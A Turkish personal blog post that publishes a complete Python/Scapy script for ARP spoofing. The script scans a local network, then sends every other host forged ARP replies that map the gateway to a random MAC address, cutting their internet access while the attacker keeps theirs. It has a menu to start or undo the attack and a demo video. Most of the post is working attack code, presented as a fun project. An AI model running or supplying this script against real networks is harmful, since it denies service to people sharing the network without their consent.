<!DOCTYPE html>
<html lang="en">
<head>
    
    <!-- Meta Tag -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    
    <!-- SEO -->
    <meta name="description" content="150 words">
    <meta name="author" content="uipasta">
    <meta name="url" content="http://www.yourdomainname.com">
    <meta name="copyright" content="company name">
    <meta name="robots" content="index,follow">
    
    
    <title>Yazılım & Güvenlik</title>
    
    <!-- Favicon -->
    <link rel="shortcut icon" href="../images/favicon/favicon.ico">
    <link rel="apple-touch-icon" sizes="144x144" type="image/x-icon" href="../images/favicon/apple-touch-icon.png">
    
    <!-- All CSS Plugins -->
    <link rel="stylesheet" type="text/css" href="../css/plugin.css">
    
    <!-- Main CSS Stylesheet -->
    <link rel="stylesheet" type="text/css" href="../css/style.css">
    
    <!-- Google Web Fonts  -->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,300,500,600,700">
    
    <!-- Syntax Highlighter  -->
    <link rel="stylesheet" type="text/css" href="../css/syntax/shCore.css">
    <link rel="stylesheet" type="text/css" href="../css/syntax/shThemeDefault.css">
    
    
    <!-- HTML5 shiv and Respond.js support IE8 or Older for HTML5 elements and media queries -->
    <!--[if lt IE 9]>
	   <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	   <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    

  </head>
<body>

	
     
	 <!-- Preloader Start -->
     <div class="preloader">
	   <div class="rounder"></div>
      </div>
     <!-- Preloader End -->
    <div id="main">
        <div class="container">
            <div class="row">
            	
                <!-- About Me (Left Sidebar) Start -->
                <div class="col-md-3 left-bar">
                   <div class="about-absolute">

                     <div class="my-pic">
                        <img style="height: 400px;" src="../images/pic/IMG_3830.JPG" alt="">
                        <a href="javascript:void(0)" class="collapsed" data-target="#menu" data-toggle="collapse"><i class="icon-menu menu"></i></a>
                         <div id="menu" class="collapse">
                           <ul class="menu-link">
                               <li><a href="../index.html"><h4 class="yazı-boyutu">Ana Sayfa</h4></a></li>
                               <li><a href="../about.html"><h4 class="yazı-boyutu">Hakkımda</h4></a></li>
                            </ul>
                         </div>
                        </div>
                     <div class="my-detail">

                        <div class="white-spacing">
                            <h1>Erdem YILDIZ</h1>
                            <h5>Siber Güvenlik Araştırmacısı</h5>
                            <h5>Python Geliştiricisi</h5>
                            <h5>Linux Hayranı</h5>
                        </div>

                       <ul class="social-icon">
                         <li><a href="https://www.facebook.com/profile.php?id=100001860038071" target="_blank" class="facebook"><i class="fa fa-facebook"></i></a></li>
                         <li><a href="https://www.youtube.com/channel/UCu5NyREC0zwn76fnj7UlevA/featured?disable_polymer=1" target="_blank" class="youtube"><i class="fa fa-youtube"></i></a></li>
                         <li><a href="https://www.linkedin.com/in/erdemyildiz/" target="_blank" class="linkedin"><i class="fa fa-linkedin"></i></a></li>
                         <li><a href="https://github.com/ErdemStar" target="_blank" class="github"><i class="fa fa-github"></i></a></li>
                        </ul>

                    </div>
                  </div>
                </div>
                <!-- About Me (Left Sidebar) End -->

                <!-- Blog Post (Right Sidebar) Start -->
                <div class="col-md-9">
                    <div class="col-md-12 page-body">
                    	<div class="row">
                            
                            <div class="sub-title">
                                <a href="../index.html" title="Go to Home Page"><i class="fa fa-arrow-circle-left"></i><h2>Ana Sayfa'ya geri dön</h2></a>
                             </div>
                            
                            <div class="col-md-12 content-page">
                              <div class="col-md-12 blog-post">

                                <!-- Post Headline Start -->
                                <div class="post-title">
                                    <h1>Python ile Local Ağ'da Internet Erişimi Engellemek</h1>
                                   </div>
                                   <!-- Post Headline End -->
                                    
                                    
                                <!-- Post Detail Start -->
                                <div class="post-info">
                                    <span>Ağustos 22, 2018 / by <a href="#" target="_blank">Erdem Yıldız</a></span>
                                </div>
                                <!-- Post Detail End -->
                                <!-- İçerik -->
                                <div class="yazı-kısmı">
                                    <p>
                                        Merhaba arkadaşlar bugün python ile yazmış olduğum script'te parametre olarak kendi IP adresinizi ve Gateway IP adresini
                                        vererek siz hariç diğer kullanıcıların internet erişimi olabildiğince engelleyen bir script'in amacını , kodlarını ve video
                                        ile kullanımı göstereceğim.
                                        <span style="font-weight: bold">Haydi bir giriş yapalım...</span>
                                    </p>





                                    <p>
                                        <span style="margin-left: 20px">
                                            Bir yazılım dilinin eğlenceli taraflarını görmek ve göstermek için ne yapabilirim düşüncesi içersindeydim.Aklıma
                                            türlü türlü projeler geldi fakat ben biraz daha <b>Network</b> bilgimi kullanarak ortaya birşey koymak istedim.
                                            Daha sonra aklıma bu tarz bir proje geldi.Bu projenin amacı ise Ev ağı veya benzeri , herkesin bir Network
                                            cihazı(<b>Switch , Router , ADLS</b>) tarafından gerekli network bilgilerini aldığı bir ortamda siz hariç herkese
                                            sizin bilgisayarınızdan bir Frame üretilerek bu frame sanki bu ağdaki Gateway adresinden çıkmış gibi gönderilir
                                            fakat bu saldırada ürettiğimiz frame'lerde gateway'in <b>MAC</b> adresi rastgele üretilerek gönderilir.
                                        </span>
                                    </p>
                                    <p>
                                        <span>
                                            Böylece siz hariç herkes <b>Arp Table</b>'ını güncelleyerek router'ın ip adresi karşına yeni <b>MAC</b> adresi bilgisini yazar.
                                            Bildiğimiz gibi <b>Data Link</b> katmanında alınan veya gönderilen frame'ler <b>MAC</b> adres bazı iletildiğinden
                                            hedefimizdeki bilgisayar'lar rasgete bir <b>MAC</b> adresine packet çıkaracak fakat bu packet hiçbir zaman Gateway
                                            üzerinden geçemeyeceği için interneti olabildiğince siz hariç herkese kısıtlamış olacağız.
                                        </span>
                                    </p>


                                    <!-- Post Coding  Start -->
                                    <div class="margin-top-40 margin-bottom-40">
                                        <pre class="brush: js">
                                            # -*- coding:utf-8 -*-
                                            from subprocess import Popen , PIPE
                                            import threading
                                            import re
                                            import platform
                                            import time
                                            import os
                                            import random
                                            from termcolor import colored, cprint
                                            import logging
                                            logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
                                            from scapy.all import *


                                            LiveIPAddr  = []
                                            PingCommand = ""
                                            STATUS = True

                                            class Attack():
                                                def __init__(self, YourIP , GatewayIP):
                                                    self.yip = YourIP
                                                    self.ip  = GatewayIP.split(".")[0] + "." + GatewayIP.split(".")[1] + "." + GatewayIP.split(".")[2] + "."

                                                    self.giy = GatewayIP
                                                    self.giyMAC = ""
                                                    self.giyFakeMAC = self.GenerateFakeMAC()

                                                    self.RealMacIP = []


                                                def ScanLiveIP(self):
                                                    a = 1
                                                    for i in range(20,261,20):
                                                        if i == 260:
                                                            i=254
                                                            t = threading.Thread(target = IPRange , args = (a , i , self.ip))
                                                            t.start()
                                                        else:
                                                            t = threading.Thread(target = IPRange , args = (a , i  , self.ip))
                                                                            t.start()
                                                        a=i

                                                def GetMacAdress(self):
                                                    LiveIPAddr.remove(self.yip)
                                                    for ip in LiveIPAddr:
                                                        pid = Popen(["arp", "-n",ip], stdout=PIPE)
                                                        s = pid.communicate()[0]
                                                        mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
                                                        if ip == self.giy:
                                                            self.giyMAC = mac
                                                        self.RealMacIP.append([ip , mac])
                                                    for i in self.RealMacIP:
                                                        print colored(i[0] +" <-> "+ i[1] , 'white', attrs=['blink'])
                                                    print colored("New gateway's mac address {} <-> {}".format(self.giy,self.giyFakeMAC) , 'white', attrs=['blink'])
                                                    print "\n"

                                                def GenerateFakeMAC(self):
                                                    tmp = "0123456789abcdef"
                                                    var = ""
                                                    for i in range(6):
                                                        var += random.choice(tmp) +""+random.choice(tmp)+":"
                                                    return var[:17]


                                                def ChangeTargetsGatewayMAC(self):

                                                    print colored('30 seconds later you can notice others people can not reach internet except you :)', 'red', attrs= ['bold'])
                                                    time.sleep(10)

                                                    for i in self.RealMacIP:
                                                        if i[0] == self.giy:
                                                            pass
                                                        else:
                                                            t = threading.Thread(target = self.ChangeThreadATTACK , args = (i[0] , i[1]) )
                                                            t.start()

                                                def ChangeThreadATTACK(self,targetIP,targetMAC):
                                                    global STATUS
                                                    while STATUS:
                                                        try:
                                                            send(ARP(op =2, pdst = targetIP, hwdst=targetMAC ,psrc = self.giy, hwsrc = self.giyFakeMAC) , verbose=False)
                                                            time.sleep(1.5)
                                                        except KeyboardInterrupt:
                                                            STATUS = False
                                                            break

                                                def RestoreAll(self):

                                                    print colored('10 seconds later others can reach internet :)', 'red', attrs= ['bold'])
                                                    time.sleep(10)

                                                    global STATUS
                                                    STATUS = False
                                                    time.sleep(5)
                                                    for i in self.RealMacIP:
                                                        if i[0] == self.giy:
                                                            pass
                                                        else:
                                                            send(ARP(op =2, psrc = i[0], hwsrc=i[1] ,pdst = self.giy, hwdst = "ff:ff:ff:ff:ff:ff") , count=5 ,verbose=False)


                                            def IPRange(first,end,ip):
                                                for i in range(first , end):
                                                    x = os.popen(PingCommand.format(ip + str(i)))
                                                    if "1 received" in x.readlines()[4]:
                                                        LiveIPAddr.append(ip+str(i))

                                            #Main Function
                                            if __name__ == "__main__":

                                                if platform.system() == "Windows":
                                                    PingCommand = "ping {} -n 1"
                                                else:
                                                    PingCommand = "ping {} -c 1 -W 1.5"

                                                print "\n"
                                                YourIP = raw_input(colored('[***]       Please enter your IP Address    : ', 'green', attrs=['bold']))
                                                IP     = raw_input(colored('[***]       Please enter Gateway IP Address : ', 'green', attrs=['bold']))
                                                print "\n"

                                                A = Attack(YourIP , IP)
                                                A.ScanLiveIP()
                                                time.sleep(20)
                                                A.GetMacAdress()
                                                while True:
                                                    print  colored('[***]  What do you want\n', 'magenta', attrs= ['bold'])
                                                    print  colored('[1] -> Do you want to kick all computer on internet except you', 'blue', attrs= ['bold'])
                                                    print  colored('[2] -> Do you want to restore all changes', 'blue', attrs= ['bold'])
                                                    print  colored('[3] -> Exit', 'blue', attrs= ['bold'])
                                                    ask = input(colored('#>', 'red', attrs= ['bold']))



                                                    if ask == 1:
                                                        A.ChangeTargetsGatewayMAC()
                                                    if ask == 2:
                                                        A.RestoreAll()
                                                    if ask == 3:
                                                        global STATUS
                                                        STATUS = False
                                                        break


                                        </pre>
                                    </div>


                                    <p style="margin-bottom: 2%">
                                        Aşağıda size script'in nasıl çalıştığını göstermek istedim.İlk başta sizin IP adresinizi daha sonra ise Gateway'in ip adresini girmenizi
                                        ister.Daha sonra size Saldırı başlatmak için 1'e , ayarları geri almak için 2'ye yada çıkmak için 3'e basmanızı ister.
                                    </p>


                                    <!-- Video kısmı-->
                                    <div class="video">
                                        <iframe width="100%" height="315" src="https://www.youtube.com/embed/_2MwYnoFW94" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
                                    </div>


                                    <!-- Tavsiye-->
                                    <div class="tavsiye" style="margin-top: 3%">
                                      <p>
                                          <span style="margin-left: 20px">
                                              Yukarıda paylaşmış olduğum kodda bir sıkıntı yada yapılabilecek iyileştirmeler için bana
                                          ulaşabilirseniz çok sevinirim.Okuduğunuz için çok teşekkür ederim.Esen kalın :)

                                          </span>

                                      </p>
                                    </div>

                                 </div>
                                    <!-- İçerik -->
                                </div>    
                             </div>
                              
                         </div>
                         

                           
                         </div>
                     
                     
                       
                       <!-- Footer Start -->
                       <div class="col-md-12 page-body margin-top-50 footer">
                          <footer>
                          <ul class="menu-link">
                               <li><a href="../index.html"><h4>Ana Sayfa</h4></a></li>
                               <li><a href="../about.html"><h4>Hakkımda</h4></a></li>
                            </ul>
                          <div class="social-menu">
                              <ul class="social-icon">
                                 <li><a href="https://www.facebook.com/profile.php?id=100001860038071" target="_blank" class="facebook"><i class="fa fa-facebook"></i></a></li>
                                 <li><a href="https://www.youtube.com/channel/UCu5NyREC0zwn76fnj7UlevA/featured?disable_polymer=1" target="_blank" class="youtube"><i class="fa fa-youtube"></i></a></li>
                                 <li><a href="https://www.linkedin.com/in/erdemyildiz/" target="_blank" class="linkedin"><i class="fa fa-linkedin"></i></a></li>
                                 <li><a href="https://github.com/ErdemStar" target="_blank" class="github"><i class="fa fa-github"></i></a></li>
                             </ul>
                          </div>
                         </footer>
                       </div>
                       <!-- Footer End -->


                  </div>
                <!-- Blog Post (Right Sidebar) End -->
                
            </div><!-- row-->
         </div> <!-- container-->
      </div> <!-- main-->
    

    <!-- Back to Top Start -->
    <a href="#" class="scroll-to-top"><i class="fa fa-long-arrow-up"></i></a>
    <!-- Back to Top End -->

    <!-- All Javascript Plugins  -->
    <script type="text/javascript" src="../js/jquery.min.js"></script>
    <script type="text/javascript" src="../js/plugin.js"></script>
    
    <!-- Main Javascript File  -->
    <script type="text/javascript" src="../js/scripts.js"></script>
    
    <!-- Syntax Highlighter Javascript File  -->
    <script type="text/javascript" src="../js/syntax/shCore.js"></script>
    <script type="text/javascript" src="../js/syntax/shBrushCss.js"></script>
    <script type="text/javascript" src="../js/syntax/shBrushJScript.js"></script>
    <script type="text/javascript" src="../js/syntax/shBrushPerl.js"></script>
    <script type="text/javascript" src="../js/syntax/shBrushPhp.js"></script>
    <script type="text/javascript" src="../js/syntax/shBrushPlain.js"></script>
    <script type="text/javascript" src="../js/syntax/shBrushPython.js"></script>
    <script type="text/javascript" src="../js/syntax/shBrushRuby.js"></script>
    <script type="text/javascript" src="../js/syntax/shBrushSql.js"></script>
    <script type="text/javascript" src="../js/syntax/shBrushVb.js"></script>
    <script type="text/javascript" src="../js/syntax/shBrushXml.js"></script>
    
	<!-- Syntax Highlighter Call Function -->
	<script type="text/javascript">
		SyntaxHighlighter.config.clipboardSwf = 'js/syntax/clipboard.swf';
		SyntaxHighlighter.all();
	</script>

    
   </body>
</html>
